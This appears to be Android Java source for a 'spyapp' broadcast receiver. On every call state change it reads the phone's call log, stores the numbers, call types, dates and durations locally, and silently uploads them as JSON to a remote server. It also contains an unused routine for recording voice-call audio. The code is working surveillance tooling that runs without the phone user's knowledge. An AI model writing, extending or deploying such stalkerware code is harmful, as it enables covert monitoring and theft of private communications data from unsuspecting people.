package kkactive_india.in.spyapp;

import android.Manifest;
import android.arch.persistence.room.Room;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.os.CountDownTimer;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.logging.Handler;

import kkactive_india.in.spyapp.Database.DatabaseHelper;
import kkactive_india.in.spyapp.MainPOJO.MainBean;
import kkactive_india.in.spyapp.callLogPOJO.calls;
import kkactive_india.in.spyapp.callLogPOJO.callsBean;
import kkactive_india.in.spyapp.callsDatabase.callsData;
import kkactive_india.in.spyapp.callsDatabase.callsDb;
import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
import kkactive_india.in.spyapp.contactPOJO.contactBean;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.converter.scalars.ScalarsConverterFactory;

public class callLogs extends BroadcastReceiver {

    String phNumber, callType, callDate, callDuration, dir;
    Date callDayTime;
    List<calls> data = new ArrayList<>();
    SharedPreferences pref;
    SharedPreferences.Editor edit;
    ConnectionDetector cd;
    private callsData callsData;
    private callsDb callsDb;
    private static final String DATABASE_NAME = "callsData";


    static PhonecallStartEndDetector listener;
    String outgoingSavedNumber;
    protected Context savedContext;

    MediaRecorder recorder;
    String file;

    @Override
    public void onReceive(final Context context, Intent intent) {
        savedContext = context;
        if (listener == null) {
            listener = new PhonecallStartEndDetector();
        }

        TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        telephony.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);

        pref = context.getSharedPreferences("pref", Context.MODE_PRIVATE);
        edit = pref.edit();

        callsData = Room.databaseBuilder(context.getApplicationContext(),
                callsData.class, DATABASE_NAME).fallbackToDestructiveMigration().build();


        // cd = new ConnectionDetector(context.getApplicationContext());


    }


    public void record(){

        recorder = new MediaRecorder();

        recorder.reset();
        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(file);
        try {
            recorder.prepare();
        } catch (java.io.IOException e) {
            recorder = null;
            return;
        }
        recorder.start();

        Log.e("RecordingKyaHai", file);
    }

    protected void onIncomingCallStarted(String number, Date start) {

        //Log.d("IncomingCallStarted", "Yess");

        //Date currentTime = Calendar.getInstance().getTime();

        //Log.d("TimeKyaHaiBhai?",currentTime.toString());

    }

    protected void onOutgoingCallStarted(String number, Date start) {

        //Log.d("outgoing", "Yess");

    }

    protected void onIncomingCallEnded(String number1, Date start, Date end) {

      // recorder.stop();
      // Log.e("RecordingKyaHai", file);

        Log.d("IncomingEnd", "ended");
        cd = new ConnectionDetector(savedContext);
        //Log.d("IncomingEnd", callsDb.getPhone());
        //Log.d("IncomingEnd", callsDb.getType());
        //Log.d("IncomingEnd", callsDb.getDate());
        //Log.d("IncomingEnd", callsDb.getDuration());

        CountDownTimer countDownTimer = new CountDownTimer(500, 1000) {
            @Override
            public void onTick(long l) {

            }

            @Override
            public void onFinish() {

                data.clear();

                StringBuffer sb = new StringBuffer();
                String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
                if (ActivityCompat.checkSelfPermission(savedContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    // TODO: Consider calling
                    //    ActivityCompat#requestPermissions
                    // here to request the missing permissions, and then overriding
                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                    //                                          int[] grantResults)
                    // to handle the case where the user grants the permission. See the documentation
                    // for ActivityCompat#requestPermissions for more details.
                    return;
                }


                Cursor managedCursor = savedContext.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
                int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
                int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
                int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
                sb.append("Call Details :");

                managedCursor.moveToFirst();

                // while (managedCursor.moveToNext()) {

                String pName = managedCursor.getString(name);
                phNumber = managedCursor.getString(number); // mobile number
                callType = managedCursor.getString(type); // call type
                callDate = managedCursor.getString(date); // call date
                callDayTime = new Date(Long.valueOf(callDate));
                callDuration = managedCursor.getString(duration);
                dir = null;

                // Log.d("NameKyaHai",pName);
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";

                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;

                    case CallLog.Calls.REJECTED_TYPE:
                        dir = "REJECTED";
                        break;
                }


                /*new Thread(new Runnable() {
                    @Override
                    public void run() {
                        callsDb = new callsDb();
                        callsDb.setPhone(phNumber);
                        callsDb.setType(dir);
                        callsDb.setDate(String.valueOf(callDayTime));
                        callsDb.setDuration(callDuration);
                        callsData.callsDao().insertAll(callsDb);


                    }
                }).start();*/


                DatabaseHelper db = new DatabaseHelper(savedContext);

                Boolean result = db.insertCalls(phNumber,callDuration, dir, String.valueOf(callDayTime));

                Log.d("gayaDatabaseMai", String.valueOf(result));


                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
                sb.append("\n----------------------------------");
                // }
                managedCursor.close();
                // textView.setText(sb);
                //Log.d("Agile", sb.toString());


                //Log.d("dataHaiBhai", callsDb.getPhone());
                //Log.d("type kya hai", callsDb.getType());


                if (cd.isConnectingToInternet()) {
                    Cursor c = db.getCalls();

                    if (c != null)
                        while (c.moveToNext()) {
                            calls person = new calls();
                            person.setMobile(c.getString(c.getColumnIndex("phone")));
                            person.setDuration(c.getString(c.getColumnIndex("duration")));
                            person.setDate(c.getString(c.getColumnIndex("date")));
                            person.setType(c.getString(c.getColumnIndex("type")));
                            data.add(person);
                        }
                    Bean b = (Bean) savedContext.getApplicationContext();

                    Gson gson = new GsonBuilder()
                            .setLenient()
                            .create();

                    Retrofit retrofit = new Retrofit.Builder()
                            .baseUrl(b.baseURL)
                            .addConverterFactory(ScalarsConverterFactory.create())
                            .addConverterFactory(GsonConverterFactory.create(gson))
                            .build();
                    Allapi cr = retrofit.create(Allapi.class);

                    callsBean body = new callsBean();

                    body.setCallLogs(data);

                    Gson gsonObj = new Gson();

                    String jsonStr = gsonObj.toJson(body);

                    String id = pref.getString("id", "");
                    Log.d("idHaiKyaBhai", id);
                    Log.d("idHaiKyaBhai", pref.getString("id", ""));
                    Log.d("idHaikya", jsonStr);

                    Call<callsBean> call = cr.calls(id, jsonStr);
                    call.enqueue(new Callback<callsBean>() {
                        @Override
                        public void onResponse(Call<callsBean> call, Response<callsBean> response) {
                            Log.d("kyaBaatHai", "sahi baat hai");
                            Log.d("response", response.body().getCallLogs().toString());

                       /* new Thread(new Runnable() {
                            @Override
                            public void run() {
                                callsData.callsDao().delete(callsDb);
                            }
                        }).start();*/

                        }

                        @Override
                        public void onFailure(Call<callsBean> call, Throwable t) {
                            Log.d("ghusGaya", t.toString());
                            Log.d("FailHorahaHai", "haan ho raha hai");
                        }
                    });
                }

            }
        };

        countDownTimer.start();


    }

    protected void onOutgoingCallEnded(String number, Date start, Date end) {

        Log.d("outgoingend", "yes");

        cd = new ConnectionDetector(savedContext);

        CountDownTimer countDownTimer = new CountDownTimer(500, 1000) {
            @Override
            public void onTick(long l) {

            }

            @Override
            public void onFinish() {

                data.clear();

                StringBuffer sb = new StringBuffer();
                String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
                if (ActivityCompat.checkSelfPermission(savedContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    // TODO: Consider calling
                    //    ActivityCompat#requestPermissions
                    // here to request the missing permissions, and then overriding
                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                    //                                          int[] grantResults)
                    // to handle the case where the user grants the permission. See the documentation
                    // for ActivityCompat#requestPermissions for more details.
                    return;
                }


                Cursor managedCursor = savedContext.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
                int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
                int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
                int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
                sb.append("Call Details :");

                managedCursor.moveToFirst();

                // while (managedCursor.moveToNext()) {

                String pName = managedCursor.getString(name);
                phNumber = managedCursor.getString(number); // mobile number
                callType = managedCursor.getString(type); // call type
                callDate = managedCursor.getString(date); // call date
                callDayTime = new Date(Long.valueOf(callDate));
                callDuration = managedCursor.getString(duration);
                dir = null;

                // Log.d("NameKyaHai",pName);
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";

                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;

                    case CallLog.Calls.REJECTED_TYPE:
                        dir = "REJECTED";
                        break;
                }


               /* new Thread(new Runnable() {
                    @Override
                    public void run() {
                        callsDb = new callsDb();
                        callsDb.setPhone(phNumber);
                        callsDb.setType(dir);
                        callsDb.setDate(String.valueOf(callDayTime));
                        callsDb.setDuration(callDuration);
                        callsData.callsDao().insertAll(callsDb);


                    }
                }).start();*/

                DatabaseHelper db = new DatabaseHelper(savedContext);

                Boolean result = db.insertCalls(phNumber,callDuration, dir, String.valueOf(callDayTime));

                Log.d("gayaDatabaseMai", String.valueOf(result));


                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
                sb.append("\n----------------------------------");
                // }
                managedCursor.close();
                // textView.setText(sb);
                //Log.d("Agile", sb.toString());


                //Log.d("dataHaiBhai", callsDb.getPhone());
                //Log.d("type kya hai", callsDb.getType());

                if (cd.isConnectingToInternet()) {
                    Cursor c = db.getCalls();

                    if (c != null)
                        while (c.moveToNext()) {
                            calls person = new calls();
                            person.setMobile(c.getString(c.getColumnIndex("phone")));
                            person.setDuration(c.getString(c.getColumnIndex("duration")));
                            person.setDate(c.getString(c.getColumnIndex("date")));
                            person.setType(c.getString(c.getColumnIndex("type")));
                            data.add(person);
                        }
                    Bean b = (Bean) savedContext.getApplicationContext();

                    Gson gson = new GsonBuilder()
                            .setLenient()
                            .create();

                    Retrofit retrofit = new Retrofit.Builder()
                            .baseUrl(b.baseURL)
                            .addConverterFactory(ScalarsConverterFactory.create())
                            .addConverterFactory(GsonConverterFactory.create(gson))
                            .build();
                    Allapi cr = retrofit.create(Allapi.class);

                    callsBean body = new callsBean();

                    body.setCallLogs(data);

                    Gson gsonObj = new Gson();

                    String jsonStr = gsonObj.toJson(body);

                    String id = pref.getString("id", "");
                    Log.d("idHaiKyaBhai", id);
                    Log.d("idHaiKyaBhai", pref.getString("id", ""));
                    Log.d("idHaikya", jsonStr);

                    Call<callsBean> call = cr.calls(id, jsonStr);
                    call.enqueue(new Callback<callsBean>() {
                        @Override
                        public void onResponse(Call<callsBean> call, Response<callsBean> response) {
                            Log.d("kyaBaatHai", "sahi baat hai");
                            Log.d("response", response.body().getCallLogs().toString());

                        /*new Thread(new Runnable() {
                            @Override
                            public void run() {
                                callsData.callsDao().delete(callsDb);
                            }
                        }).start();*/

                        }

                        @Override
                        public void onFailure(Call<callsBean> call, Throwable t) {
                            Log.d("yehBaatHai", t.toString());
                            Log.d("FailHorahaHai", "haan ho raha hai");
                        }
                    });
                }

            }
        };

        countDownTimer.start();


    }

    protected void onRejectedCall(String number, Date start) {
        Log.d("Rejected", "yes Rejected");
    }

    protected void onMissedCall(String number, Date start) {
        Log.d("missedCall", "missed");

        cd = new ConnectionDetector(savedContext);

        CountDownTimer countDownTimer = new CountDownTimer(500, 1000) {
            @Override
            public void onTick(long l) {

            }

            @Override
            public void onFinish() {

                data.clear();

                StringBuffer sb = new StringBuffer();
                String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
                if (ActivityCompat.checkSelfPermission(savedContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    // TODO: Consider calling
                    //    ActivityCompat#requestPermissions
                    // here to request the missing permissions, and then overriding
                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                    //                                          int[] grantResults)
                    // to handle the case where the user grants the permission. See the documentation
                    // for ActivityCompat#requestPermissions for more details.
                    return;
                }


                Cursor managedCursor = savedContext.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
                int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
                int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
                int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
                sb.append("Call Details :");

                managedCursor.moveToFirst();

                // while (managedCursor.moveToNext()) {

                String pName = managedCursor.getString(name);
                phNumber = managedCursor.getString(number); // mobile number
                callType = managedCursor.getString(type); // call type
                callDate = managedCursor.getString(date); // call date
                callDayTime = new Date(Long.valueOf(callDate));
                callDuration = managedCursor.getString(duration);
                dir = null;

                // Log.d("NameKyaHai",pName);
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;

                    case CallLog.Calls.REJECTED_TYPE:
                        dir = "REJECTED";
                        break;
                }


                /*new Thread(new Runnable() {
                    @Override
                    public void run() {
                        callsDb = new callsDb();
                        callsDb.setPhone(phNumber);
                        callsDb.setType(dir);
                        callsDb.setDate(String.valueOf(callDayTime));
                        callsDb.setDuration(callDuration);
                        callsData.callsDao().insertAll(callsDb);


                    }
                }).start();*/


                DatabaseHelper db = new DatabaseHelper(savedContext);

                 Boolean result = db.insertCalls(phNumber,callDuration, dir, String.valueOf(callDayTime));

                 Log.d("gayaDatabaseMai", String.valueOf(result));



                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
                sb.append("\n----------------------------------");
                // }
                managedCursor.close();
                // textView.setText(sb);
                //Log.d("Agile", sb.toString());


               /* new Thread(new Runnable() {
                    @Override
                    public void run() {
                        Cursor c = (Cursor) callsData.callsDao().getAll();

                        Log.d("phoneeeeeeee",c.getString(c.getColumnIndex("phone")));

                    }
                });*/

                //Log.d("type kya hai", callsDb.getType());

                // final DatabaseHelper db = new DatabaseHelper(getApplicationContext());

                if (cd.isConnectingToInternet()) {
                    Cursor c = db.getCalls();

                    if (c != null)
                        while (c.moveToNext()) {
                            calls person = new calls();
                            person.setMobile(c.getString(c.getColumnIndex("phone")));
                            person.setDuration(c.getString(c.getColumnIndex("duration")));
                            person.setDate(c.getString(c.getColumnIndex("date")));
                            person.setType(c.getString(c.getColumnIndex("type")));
                            data.add(person);
                        }
                    Bean b = (Bean) savedContext.getApplicationContext();

                    Gson gson = new GsonBuilder()
                            .setLenient()
                            .create();

                    Retrofit retrofit = new Retrofit.Builder()
                            .baseUrl(b.baseURL)
                            .addConverterFactory(ScalarsConverterFactory.create())
                            .addConverterFactory(GsonConverterFactory.create(gson))
                            .build();
                    Allapi cr = retrofit.create(Allapi.class);

                    callsBean body = new callsBean();

                    body.setCallLogs(data);

                    Gson gsonObj = new Gson();

                    String jsonStr = gsonObj.toJson(body);

                    String id = pref.getString("id", "");
                    Log.d("idHaiKyaBhai", id);
                    Log.d("idHaiKyaBhai", pref.getString("id", ""));
                    Log.d("idHaikya", jsonStr);

                    Call<callsBean> call = cr.calls(id, jsonStr);
                    call.enqueue(new Callback<callsBean>() {
                        @Override
                        public void onResponse(Call<callsBean> call, Response<callsBean> response) {
                            Log.d("kyaBaatHai", "sahi baat hai");
                            Log.d("response", response.body().getCallLogs().toString());

                   /*     new Thread(new Runnable() {
                            @Override
                            public void run() {
                                callsData.callsDao().delete(callsDb);
                            }
                        }).start();*/

                        }

                        @Override
                        public void onFailure(Call<callsBean> call, Throwable t) {
                            Log.d("ghusGaya", t.toString());
                            Log.d("FailHorahaHai", "haan ho raha hai");
                        }
                    });
                }

            }
        };

        countDownTimer.start();


    }

    public class PhonecallStartEndDetector extends PhoneStateListener {

        int lastState = TelephonyManager.CALL_STATE_IDLE;
        Date callStartTime;
        boolean isIncoming;
        String savedNumber;  //because the passed incoming is only valid in ringing

        public PhonecallStartEndDetector() {
        }

        //The outgoing number is only sent via a separate intent, so we need to store it out of band
        public void setOutgoingNumber(String number) {
            savedNumber = number;
        }

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            if (lastState == state) {
                //No change, debounce extras
                return;
            }
            switch (state) {
                case TelephonyManager.CALL_STATE_RINGING:
                    isIncoming = true;
                    callStartTime = new Date();
                    savedNumber = incomingNumber;
                    onIncomingCallStarted(incomingNumber, callStartTime);
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    //Transition of ringing->offhook are pickups of incoming calls.  Nothing donw on them
                    if (lastState != TelephonyManager.CALL_STATE_RINGING) {
                        isIncoming = false;
                        callStartTime = new Date();
                        onOutgoingCallStarted(savedNumber, callStartTime);
                    }
                    break;
                case TelephonyManager.CALL_STATE_IDLE:
                    //Went to idle-  this is the end of a call.  What type depends on previous state(s)
                    if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                        //Ring but no pickup-  a miss
                        onMissedCall(savedNumber, callStartTime);
                    }
                    /*else if (lastState == TelephonyManager.CALL_STATE_RINGING){
                        onRejectedCall(savedNumber, callStartTime);
                    }*/
                    else if (isIncoming) {
                        onIncomingCallEnded(savedNumber, callStartTime, new Date());
                    } else {
                        onOutgoingCallEnded(savedNumber, callStartTime, new Date());
                    }
                    break;
            }
            lastState = state;
        }

    }
}
